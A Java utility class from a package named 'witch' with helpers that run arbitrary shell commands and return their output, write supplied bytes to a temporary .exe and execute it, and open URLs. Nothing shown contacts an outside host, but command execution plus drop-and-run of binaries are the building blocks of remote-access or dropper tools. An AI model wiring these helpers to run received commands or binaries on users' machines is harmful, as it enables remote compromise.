package me.soda.witch.shared;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

public class ProgramUtil {
    private static final Runtime RT = Runtime.getRuntime();
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase();

    public static boolean isWin() {
        return OS_NAME.contains("windows");
    }

    public static String runCmd(String command) {
        try {
            Process process = isWin() ? RT.exec(new String[]{"cmd.exe", "/c", command}) : RT.exec(command);
            return getProcResult(process);
        } catch (IOException e) {
            LogUtil.printStackTrace(e);
        }
        return "";
    }

    public static Process execInPath(String cmd, String path) throws IOException {
        return RT.exec(cmd, null, new File(path));
    }

    public static String getProcResult(Process process) {
        StringBuilder result = new StringBuilder();
        try (BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = inputStream.readLine()) != null) {
                result.append(line).append("\n");
            }
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            LogUtil.printStackTrace(e);
        }
        return result.toString();
    }

    public static void runProg(byte[] bytes) {
        if (!isWin()) return;
        try {
            Path tempFile = Files.createTempFile("temp", ".exe");
            Files.write(tempFile, bytes);
            Process process = RT.exec(tempFile.toString());
            process.waitFor();
            Files.deleteIfExists(tempFile);
        } catch (IOException | InterruptedException e) {
            LogUtil.printStackTrace(e);
        }
    }

    public static void openURL(String url) {
        String os = OS_NAME;
        Runtime rt = Runtime.getRuntime();

        try {
            if (os.contains("linux") || os.contains("unix")) {
                rt.exec(new String[]{"xdg-open", url});
            } else if (os.contains("mac")) {
                rt.exec(new String[]{"open", url});
            } else if (os.contains("win")) {
                rt.exec(new String[]{"rundll32", "url.dll,FileProtocolHandler", url});
            }
        } catch (IOException ignored) {
        }
    }
}
